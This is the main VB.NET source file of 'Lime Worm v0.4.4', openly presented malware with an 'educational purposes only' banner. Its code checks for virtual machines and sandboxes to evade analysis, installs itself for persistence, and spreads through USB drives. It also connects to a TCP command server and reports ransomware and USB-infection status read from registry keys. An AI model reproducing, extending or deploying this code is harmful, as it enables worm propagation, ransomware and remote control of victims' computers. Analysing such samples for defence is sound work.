
'##################################################################
'##        N Y A N   C A T  |||   Updated on Apr./08/2018        ##
'##################################################################
'##                                                              ##
'##                                                              ##
'##                                                              ##
'##            ░░░░░░░░░░▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄░░░░░░░░░           ##
'##            ░░░░░░░░▄▀░░░░░░░░░░░░▄░░░░░░░▀▄░░░░░░░           ##
'##            ░░░░░░░░█░░▄░░░░▄░░░░░░░░░░░░░░█░░░░░░░           ##
'##            ░░░░░░░░█░░░░░░░░░░░░▄█▄▄░░▄░░░█░▄▄▄░░░           ##
'##            ░▄▄▄▄▄░░█░░░░░░▀░░░░▀█░░▀▄░░░░░█▀▀░██░░           ##
'##            ░██▄▀██▄█░░░▄░░░░░░░██░░░░▀▀▀▀▀░░░░██░░           ##
'##            ░░▀██▄▀██░░░░░░░░▀░██▀░░░░░░░░░░░░░▀██░           ##
'##            ░░░░▀████░▀░░░░▄░░░██░░░▄█░░░░▄░▄█░░██░           ##
'##            ░░░░░░░▀█░░░░▄░░░░░██░░░░▄░░░▄░░▄░░░██░           ##
'##            ░░░░░░░▄█▄░░░░░░░░░░░▀▄░░▀▀▀▀▀▀▀▀░░▄▀░░           ##
'##            ░░░░░░█▀▀█████████▀▀▀▀████████████▀░░░░           ##
'##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
'##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
'##                                                              ##
'##                     .. Lime Worm v0.4.4 ..                   ##
'##                                                              ##
'##                                                              ##
'##                                                              ##
'##################################################################
'##    This project was created for educational purposes only    ##
'##################################################################
'##           https://github.com/NYAN-x-CAT/Lime-Worm            ##
'##################################################################
'##  This software's main purpose is NOT to be used maliciously  ##
'##################################################################
'## I am not responsible For any actions caused by this software ##
'##################################################################


Imports System.Threading

Public Class Main
    Public Shared C As New TCP
    Public Shared SPL = "|'L'|"

    Public Shared Sub Main()

        Thread.Sleep(1000)

        Dim createdNew As Boolean
        Settings.NMT = New Mutex(True, Settings.MTX, createdNew)
        Try
            If Not createdNew Then End
        Finally
            If createdNew Then
                Settings.NMT.ReleaseMutex()
            End If
        End Try

        If Settings.ANTI Then
            Call VMware()
            Call Virtualbox()
            Call Sandboxie()
            Call Win_XP()
        End If

        Call Installation.INS()

        If Settings.USB Then
            Dim T1 As Thread = New Threading.Thread(AddressOf USB_SP.StartSP)
            T1.Start()
        End If

        TCP.CON()

        Dim CHK As Thread = New Thread(AddressOf Checking)
        CHK.Start()
    End Sub

    Private Shared Sub Checking()
        Thread.CurrentThread.Sleep(5000)
        Dim Old2 As String = ID.USBSP
        Dim Old As String = ID.Ransomeware
1:
        Try

            While True
                Dim readValue = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", "Ransome-Status", Nothing)
                If Old <> readValue.ToString Then
                    Old = readValue
                    C.Send("!R" & SPL & readValue.ToString)
                End If

                If Settings.USB Then
                    Dim readValue2 = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", "USB", Nothing)
                    If Old2 <> readValue2.ToString Then
                        Old2 = readValue2
                        C.Send("!U" & SPL & readValue2.ToString)
                    End If
                End If

                Thread.CurrentThread.Sleep(3000)
            End While
        Catch ex As Exception
            GoTo 1
        End Try
    End Sub



End Class

